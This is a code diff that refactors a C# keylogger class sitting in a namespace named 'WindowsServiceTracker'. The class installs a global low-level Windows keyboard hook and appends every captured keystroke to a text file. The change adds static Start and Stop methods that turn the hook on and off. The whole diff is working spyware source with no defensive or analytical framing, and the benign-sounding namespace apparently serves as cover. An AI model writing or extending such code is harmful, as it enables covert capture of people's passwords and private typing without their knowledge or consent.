@@ -5,7 +5,6 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.IO;
-using System.Text;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
@@ -18,56 +17,33 @@ namespace WindowsServiceTracker
         private const int WM_KEYDOWN = 0x0100;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
-        private Thread loggingThread = null;
+        private static bool logging = false;
+        //private static bool firstStart = true;
 
-        public Keylogger()
-        {
-        }
+        //public Keylogger()
+        //{
+        //}
 
-        private void KeyloggerThread()
+        public static void Start()
         {
-            try
+            if (!logging)
             {
                 _hookID = SetHook(_proc);
-                UnhookWindowsHookEx(_hookID);
-                while (true)
-                {
-                    Thread.Sleep(1000);
-                }
-            }
-            catch (ThreadAbortException)
-            {
+                logging = true;
             }
         }
 
-        public void Start()
+        public static void Stop()
         {
-            if (loggingThread == null)
-            {
-                loggingThread = new Thread(new ThreadStart(KeyloggerThread));
-                loggingThread.Start();
-            }
-        }
-
-        public void Stop()
-        {
-            if (loggingThread != null || !loggingThread.IsAlive)
-            {
-                try
-                {
-                    loggingThread.Abort();
-                }
-                catch (ThreadAbortException)
-                {
-                }
-            }
+            logging = false;
+            UnhookWindowsHookEx(_hookID);
         }
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            if (logging && nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 StreamWriter sw = new StreamWriter("keylogTEST.txt", true);
